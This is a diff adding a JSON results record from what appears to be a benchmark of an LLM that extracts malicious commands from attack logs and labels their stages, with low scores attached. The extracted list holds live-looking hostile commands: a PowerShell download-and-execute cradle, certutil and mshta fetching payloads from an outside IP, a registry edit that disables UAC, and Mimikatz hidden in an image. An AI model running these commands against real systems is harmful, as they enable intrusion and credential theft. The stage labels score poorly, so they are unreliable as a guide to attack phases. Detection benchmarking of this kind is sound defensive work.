@@ -1,0 +1,120 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2035\u067e\u0627\u06fb\u0651\u0645B.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\\\msxsl.exe' 'c:\\\\Windows\\\\Temp\\\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C chromeRemoteServices.ps1",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"net group \\\"domain admins\\\" /domain\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1022 \"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1547.001 -TestNumbers 1\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" /v EnableLUA /t REG_DWORD /d 0 /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\" /v verifierdlls /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\\\Invoke-Mimikatz.ps1 -Out .\\\\evil-kiwi.png -Image .\\\\995647.jpg\"",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "An attacker appears to have gained access through an initial exploitation vector involving PowerShell scripts, using techniques such as bypassing execution policies to download files from remote locations. The attacker has escalated privileges and collected sensitive information, maintaining persistence through registry modifications and utilizing tools like Mimikatz for credential dumping.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 72258,
+      "completion_tokens": 1376,
+      "total_tokens": 73634,
+      "wall_clock_s": 68.204,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.17647058823529413,
+      "recall": 0.13043478260869565,
+      "f1": 0.15,
+      "tp": 3,
+      "fp": 14,
+      "fn": 20
+    },
+    "stage": {
+      "precision": 0.11764705882352941,
+      "recall": 0.08695652173913043,
+      "f1": 0.09999999999999999,
+      "tp": 2,
+      "fp": 15,
+      "fn": 21,
+      "recall_partial": 0.10869565217391304
+    },
+    "hallucination_rate": 0.07692307692307693,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 72258,
+      "completion_tokens": 1376,
+      "total_tokens": 73634,
+      "wall_clock_s": 68.204,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
